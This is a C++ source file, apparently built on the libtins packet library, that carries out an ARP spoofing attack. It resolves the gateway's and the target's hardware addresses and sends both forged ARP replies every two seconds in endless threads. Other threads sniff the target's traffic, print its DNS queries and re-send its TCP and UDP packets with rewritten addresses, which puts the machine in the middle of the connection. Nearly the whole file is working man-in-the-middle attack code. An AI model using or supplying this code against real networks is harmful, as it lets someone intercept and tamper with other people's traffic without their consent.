#include "arp.h"
#include <unistd.h>
#include <thread>
#include <string>
EthernetII::address_type itoh(NetworkInterface iface, IPv4Address ip)
{
    PacketSender sender;
    return Utils::resolve_hwaddr(iface, ip, sender);
}

void send_arp_loop(IPv4Address to_ip, IPv4Address from_ip, addr_type to_hw, NetworkInterface iface, NetworkInterface::Info info)
{
    ARP arp(to_ip, from_ip, to_hw, info.hw_addr);    
    arp.opcode(ARP::REPLY);
    EthernetII eth = EthernetII(to_hw, info.hw_addr) / arp;
    PacketSender sender;
    while (true)
    {
        sender.send(eth, iface);
        sleep(2);
    }
}

void check_dns(DNS my_dns)
{
    cout << "┎─[DNS]───────────────────┒" << endl;
    for (const auto &query : my_dns.queries())
    {
        cout << "┃ [TYPE] " << DNS::QRType(query.type()) << endl;
        cout << "┃ [QTYPE] " << query.query_type() << endl;
        cout << "┃ [DNAME] " << query.dname() << endl;
        cout << "┃ [CLASS] " << query.query_class() << endl;
    }
    cout << "┖─────────────────────────┚" << endl;
    cout << endl;
}

void ip_forwarding(IPv4Address to, IPv4Address from, addr_type to_hw,
                   addr_type from_hw, string device, IPv4Address my_ip_addr)
{
    Sniffer from_sniffer(device);
    from_sniffer.set_filter("ip src " + from.to_string());
    PDU *pdu;
    PacketSender sender;
    uint64_t i = 0;    
    NetworkInterface iface("wlp2s0");
    NetworkInterface::Info info = iface.addresses();
    while (true)
    {
        printf("\x1b[41m▶              %ld              ◀\x1 ", i++);
        printf("\x1b[0m");
        cout << endl;
        pdu = from_sniffer.next_packet();
        if (pdu) {
            cout << "catched " << from.to_string() << endl;
            try
            {
                auto my_eth = pdu->rfind_pdu<EthernetII>();
                cout << "[ETHERNET II] " << endl <<"dst : " <<my_eth.dst_addr().to_string()<<endl<<"src : "<<my_eth.src_addr().to_string()<<endl;
                auto my_ip = my_eth.rfind_pdu<IP>();
                cout << "[IP]" << endl<<"dst : "<<my_ip.dst_addr().to_string() << endl <<"src : "<< my_ip.src_addr().to_string()<< endl;
                switch (my_ip.inner_pdu()->pdu_type())
                {
                    case SLL::PDUType::TCP:
                    {
                        cout << "[TCP]" << endl;
                        auto my_tcp = my_ip.rfind_pdu<TCP>();                                        
                        EthernetII new_eth = EthernetII(to_hw,info.hw_addr)/IP(to,my_ip_addr)/ my_tcp;                        
                        cout<<"=========[SEND 2 Forwarding]========="<<endl; 
                        cout<<"[ETHERNET II]" << endl;
                        cout<<"hw dst : "<<new_eth.dst_addr().to_string()<<endl;                    
                        cout<<"hw src : "<<new_eth.src_addr().to_string()<<endl;
                        cout<<"ip dst : "<<new_eth.find_pdu<IP>()->dst_addr().to_string()<< endl;
                        cout<<"ip src : "<<new_eth.find_pdu<IP>()->src_addr().to_string()<< endl;
                        sender.send(new_eth);                        
                        break;
                     }
                    case SLL::PDUType::UDP: 
                    {
                        cout << "[UDP]" << endl;
                        auto my_udp = my_ip.rfind_pdu<UDP>();
                        auto my_dns = my_udp.rfind_pdu<RawPDU>().to<DNS>();
                        check_dns(my_dns);
                        my_eth.src_addr(info.hw_addr);
                        my_eth.dst_addr(to_hw);

                        my_ip.src_addr(my_ip_addr);
                        my_ip.dst_addr(to);                                        
                        
                        EthernetII new_eth = my_eth / my_ip/ my_udp ;
                        cout<<"=========[SEND 2 Forwarding]========="<<endl; 
                        cout<<"[ETHERNET II]" << endl;
                        cout<<"hw dst : "<<new_eth.dst_addr().to_string()<<endl;                    
                        cout<<"hw src : "<<new_eth.src_addr().to_string()<<endl;
                        sender.send(new_eth);                        
                        break;
                    }
                    default:
                    {
                        cout<<"[DEFAULT]"<<endl;
                    }                
                }
            }
            catch (...)
            {
                continue;
            }
        }
        cout << endl;

    }
    delete pdu;
}

void do_arp_spoofing(NetworkInterface iface, IPv4Address gw,
                     IPv4Address target, const NetworkInterface::Info &info, IPv4Address my_ip_addr)
{
    addr_type gw_hw = itoh(iface, gw);
    addr_type target_hw = itoh(iface, target);

    cout << "────────────────────┰─────────────────────" << endl;
    cout << " Gateway hw address ┃ " << gw_hw << endl;
    cout << "────────────────────╂─────────────────────" << endl;
    cout << " Target hw address  ┃ " << target_hw << endl;
    cout << "────────────────────╂─────────────────────" << endl;
    cout << " Own hw address     ┃ " << info.hw_addr << endl;
    cout << "────────────────────┸─────────────────────" << endl;
    //send_arp_loop(gw,target,gw_hw,iface,info);
    thread t1(send_arp_loop, gw, target, gw_hw, iface, info);
    thread t2(send_arp_loop, target, gw, target_hw, iface, info);
    thread t3(ip_forwarding, gw, target, gw_hw, target_hw, iface.name(), my_ip_addr);
    thread t4(ip_forwarding, target,gw,target_hw,gw_hw, iface.name(), my_ip_addr);
    t1.join();
    t2.join();
    t3.join();
    t4.join();
}
